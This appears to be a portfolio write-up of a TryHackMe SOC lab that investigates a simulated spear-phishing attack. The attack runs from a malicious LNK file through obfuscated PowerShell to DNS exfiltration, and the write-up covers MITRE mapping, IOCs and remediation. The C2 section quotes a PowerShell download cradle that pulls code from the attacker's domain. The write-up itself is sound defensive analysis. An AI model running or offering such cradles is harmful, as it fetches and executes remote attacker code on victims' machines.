# 🕵️ SOC Investigation: Operation Boogeyman (Phishing-to-Exfiltration)

## 📌 Project Overview

This project is a detailed forensic investigation of a simulated targeted phishing attack. As a SOC Analyst, I **analysed** a workstation compromise starting from the initial email delivery, through PowerShell-based execution, to the final exfiltration of sensitive user data.

---

## ☣️ The Attack Lifecycle (Kill Chain)

### 1. Delivery & Exploitation

The attack began with a spear-phishing email containing a malicious ZIP archive (`Invoice_20230103.zip`).

* **The Hook:** A shortcut file (.LNK) disguised as a PDF invoice.
* **The Payload:** Once clicked, the shortcut executed a hidden, Base64-encoded PowerShell command to bypass execution policies.

### 2. Command & Control (C2)

By deobfuscating the PowerShell script using **CyberChef**, I identified the attacker's infrastructure:

* **C2 Domain:** `files.bpackaging.xyz`
* **Download Cradle:** `(New-Object Net.WebClient).DownloadString('http://files.bpackaging.xyz/update')`

### 3. Post-Exploitation & Data Theft

The attacker performed internal discovery to find high-value targets.

* **Targeted Files:** The attacker targeted the **Microsoft Sticky Notes** database (`StickyNotes.snt`) and a **KeePass** password vault.
* **Exfiltration Method:** To avoid detection by web firewalls, the attacker used **DNS Exfiltration** (tunneling data out through DNS queries).

---

## 🛠️ Tools Used

* **CyberChef:** Used for deobfuscating Base64 PowerShell commands.
* **Wireshark / Brim:** **Analysed** PCAP traffic to identify C2 beaconing.
* **Linux Command Line (`jq`, `grep`):** Parsed through JSON-formatted Windows Event Logs.
* **MITRE ATT&CK Framework:** Mapped attacker behaviours to known TTPs.

---

## 🛡️ Mapping to MITRE ATT&CK

| Tactic | Technique | ID | Observation |
| --- | --- | --- | --- |
| **Initial Access** | Phishing: Spearphishing Attachment | T1566.001 | Malicious ZIP containing .LNK file. |
| **Execution** | Command and Scripting Interpreter: PowerShell | T1059.001 | Obfuscated PowerShell execution via shortcut. |
| **Persistence** | Scheduled Task/Job: Scheduled Task | T1053.005 | Created "Updater" task for reboot survival. |
| **Exfiltration** | Exfiltration Over Alternative Protocol: DNS | T1048.003 | Data sent out via DNS query subdomains. |

---

## 📊 Technical Artifacts (Indicators of Compromise)

| Type | Value | Description |
| --- | --- | --- |
| **Domain** | `files.bpackaging.xyz` | Attacker C2 Server |
| **File Name** | `Invoice_20230103.lnk` | Initial Execution Vector |
| **Tool** | `sq3.exe` | Used by attacker to read SQLite databases |
| **Technique** | DNS Tunneling | Stealthy Exfiltration Method |

---

## 💡 Key Takeaways & Remediation

1. **Disable Script Hosts:** Standard users should not be permitted to execute `.lnk` or `.js` files via Windows Script Host.
2. **DNS Monitoring:** SOC teams should alert on high volumes of unique DNS queries to unknown subdomains (a primary indicator of exfiltration).
3. **User Education:** Phishing remains the primary entry point; technical controls must be paired with regular user awareness training.

---

*This investigation was performed as part of the TryHackMe SOC Level 1 path to demonstrate proficiency in endpoint and network analysis.*

[⬅️ Back to Profile Hub](https://www.google.com/search?q=https://github.com/ssaunders91)

-----
